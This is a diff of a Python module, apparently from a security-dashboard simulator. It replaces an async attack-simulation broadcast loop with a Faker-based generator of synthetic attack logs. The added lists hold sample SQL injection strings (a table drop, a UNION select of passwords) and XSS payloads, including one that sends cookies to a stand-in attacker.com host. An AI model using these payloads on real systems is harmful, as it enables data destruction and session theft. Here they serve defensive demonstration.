@@ -1,54 +1,68 @@
-import asyncio
-from models import database
-from services import engine, ai_engine
+from faker import Faker
+import random
+from datetime import datetime
+from backend.models.models import AttackLog
+import json
 
-connected_clients = set() # Global set for streaming
+fake = Faker()
 
-async def global_attack_generator():
-    """Deterministic 3-second simulation loop. Passive by default."""
-    while True:
-        if database.simulation_active:
-            try:
-                # 3. ATTACK SIMULATION ENGINE
-                attack = engine.generate_attack()
-                
-                # 4. LOG GENERATION
-                log_entry = engine.generate_log(attack)
-                
-                # 5. DETECTION ENGINE (STRICT RULE-BASED)
-                detection = engine.detect_threat(log_entry)
-                
-                # 6. RESPONSE ENGINE (AUTOMATED)
-                response = engine.respond(detection, log_entry)
-                
-                # Persist to Ledger
-                database.insert_log(log_entry)
-                database.insert_detection(log_entry["log_id"], detection)
-                database.insert_response(log_entry["log_id"], response)
-                
-                # 7. AI EXPLAINER (STRICT 2-3 SENTENCES)
-                ai_intel = await ai_engine.generate_explanation(log_entry["raw_log"], detection)
-                
-                # Real-time Payload
-                payload = {
-                    "attack": attack,
-                    "log": log_entry,
-                    "detection": {**detection, "explanation": ai_intel},
-                    "response": response,
-                    "type": "STREAM_UPDATE"
-                }
+COUNTRIES = [
+    {"name": "USA", "lat": 37.0902, "lng": -95.7129},
+    {"name": "Russia", "lat": 61.5240, "lng": 105.3188},
+    {"name": "China", "lat": 35.8617, "lng": 104.1954},
+    {"name": "Brazil", "lat": -14.2350, "lng": -51.9253},
+    {"name": "Germany", "lat": 51.1657, "lng": 10.4515},
+    {"name": "India", "lat": 20.5937, "lng": 78.9629},
+    {"name": "North Korea", "lat": 40.3399, "lng": 127.5101},
+    {"name": "Israel", "lat": 31.0461, "lng": 34.8516},
+    {"name": "UK", "lat": 55.3781, "lng": -3.4360},
+    {"name": "Iran", "lat": 32.4279, "lng": 53.6880}
+]
 
-                # 9. REAL-TIME BROADCAST
-                disconnected = set()
-                for client in connected_clients:
-                    try:
-                        await client.send_json(payload)
-                    except Exception:
-                        disconnected.add(client)
-                for c in disconnected: connected_clients.remove(c)
+ATTACK_TYPES = ["SQL Injection", "Brute Force", "XSS"]
 
-            except Exception as e:
-                print(f"[TACTICAL_CORE_ERROR] {e}")
-        
-        # STRICT 3-SECOND CYCLE
-        await asyncio.sleep(3.0)
+SQL_PAYLOADS = [
+    "SELECT * FROM users WHERE id = 1 OR 1=1",
+    "admin' --",
+    "'; DROP TABLE users; --",
+    "UNION SELECT username, password FROM users",
+    "OR '1'='1' --"
+]
+
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(document.cookie)",
+    "'; document.location='http://attacker.com/steal?c='+document.cookie; //"
+]
+
+BRUTE_FORCE_PAYLOADS = [
+    "password123", "admin123", "123456", "qwerty", "supersecret"
+]
+
+def generate_random_attack():
+    attack_type = random.choice(ATTACK_TYPES)
+    country_data = random.choice(COUNTRIES)
+    ip = fake.ipv4()
+    
+    if attack_type == "SQL Injection":
+        payload = random.choice(SQL_PAYLOADS)
+    elif attack_type == "XSS":
+        payload = random.choice(XSS_PAYLOADS)
+    else:
+        payload = f"login_attempt: {random.choice(BRUTE_FORCE_PAYLOADS)}"
+    
+    timestamp = datetime.utcnow()
+    # Format: [Timestamp] IP - "POST /login HTTP/1.1" 401 "payload"
+    status_code = random.choice([200, 401, 403, 404, 500])
+    raw_log = f"[{timestamp.strftime('%Y-%m-%d %H:%M:%S')}] {ip} - \"POST /api/gate HTTP/1.1\" {status_code} \"{payload}\""
+    
+    return {
+        "source_ip": ip,
+        "country": country_data["name"],
+        "latitude": country_data["lat"],
+        "longitude": country_data["lng"],
+        "attack_type": attack_type,
+        "payload": payload,
+        "raw_log": raw_log
+    }
